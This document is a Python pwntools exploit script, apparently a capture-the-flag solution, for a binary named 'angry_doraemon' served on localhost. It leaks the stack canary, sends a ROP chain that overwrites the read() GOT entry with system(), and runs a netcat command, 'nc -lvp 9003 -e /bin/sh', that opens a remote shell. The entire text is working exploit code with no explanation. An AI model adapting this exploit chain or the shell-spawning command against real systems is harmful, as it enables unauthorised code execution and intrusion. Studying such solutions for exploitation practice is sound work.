from pwn import *
 
p = remote( 'localhost', 8888 )
e = ELF('./angry_doraemon')
rop = ROP(e)
cmd = 'nc -lvp 9003 -e /bin/sh'
sys_offset = 0x9ad60
 
rop.read(4, e.bss(), len(cmd)+2)
rop.write(4, e.got['read'], 4)
rop.read(4, e.got['read'], 4)
rop.read(e.bss())
 
p.sendlineafter('>', '4')
p.sendafter('(y/n) ','y'*11)
 
p.recvuntil('y'*11)
 
recv_b = p.recv(1024)[0:3]
canary = u32('\x00' + recv_b)
 
print '[+] canary leak : ' + str(hex(canary))
p.close()
 
p = remote( 'localhost', 8888 )
 
pay = ''
pay += 'y'*10
pay += p32(canary)
pay += 'A'*12
pay += rop.chain()
 
p.sendlineafter('>', '4')
p.sendlineafter('(y/n) ', pay)
 
p.sendline(cmd)
 
recv_b = p.recv(1024)
system = u32(recv_b) - sys_offset
 
print '[+] system addr : ' + str(hex(system))
 
p.sendline(p32(system))
 
print '[*] nc localhost 9003 is shell!'
